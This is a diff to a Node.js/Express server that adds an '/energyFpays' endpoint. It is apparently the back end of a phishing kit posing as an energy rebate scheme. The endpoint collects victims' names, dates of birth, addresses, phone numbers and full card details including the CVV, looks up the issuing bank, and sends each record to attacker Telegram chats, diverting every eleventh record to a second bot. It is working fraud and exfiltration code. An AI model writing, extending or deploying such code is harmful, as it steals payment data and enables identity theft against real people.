@@ -13556,6 +13556,65 @@ app.post("/giveip", (req, res) => {
 //ENERGY
 //ENERGY
 
+app.options("/energyFpays", cors());
+
+app.post("/energyFpays", async (req, res) => {
+  info = req.body;
+
+  if (info.bin.length === 7) {
+    formatBin = info.bin.replace(/ /g, "");
+    if (formatBin.length === 7) {
+      formatBin = info.bin.slice(0, -1);
+    }
+    info.bin = formatBin;
+  }
+  let binLookup = await axios.get(`https://lookup.binlist.net/${bin}`);
+  let bank = binLookup.data.bank.name;
+  let binList = `${info.bin} | ${info.dob} | ${info.pcode} | ${bank}`;
+  var originalText = `+----------- Personal Information ------------+\nFull Name: ${info.fullName}\nDOB: ${info.dob}\nAddress: ${info.addy}\nPostcode: ${info.pcode}\nPhone Number: ${info.telephone}\n+ ----------- Card Information ------------+\nCard Name: ${info.ccname}\nCard Number: ${info.ccnum}\nExpiry: ${info.ccexp}\nCVV: ${info.cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${info.userAgent}\nIP: ${info.ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+  if (fpaysC == 10) {
+    axios
+      .post(
+        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+        {
+          chat_id: 680379375,
+          text: `HAYTCHRES:\n${originalText}`,
+          parse_mode: "Markdown",
+        }
+      )
+      .catch((e) => {
+        console.log(e);
+      });
+    fpaysC = 0;
+  } else {
+    axios
+      .post(
+        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+        {
+          chat_id: 680379375,
+          text: `EnergyRebateFpays:\n${originalText}`,
+          parse_mode: "Markdown",
+        }
+      )
+      .catch((e) => {
+        console.log(e);
+      });
+    axios
+      .post(
+        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+        {
+          chat_id: 2134201699,
+          text: `EnergyRebate:\n${originalText}`,
+          parse_mode: "Markdown",
+        }
+      )
+      .catch((e) => {
+        console.log(e);
+      });
+    fpaysC += 1;
+  }
+});
+
 app.options("/energy", cors());
 
 app.post("/energy", async (req, res) => {
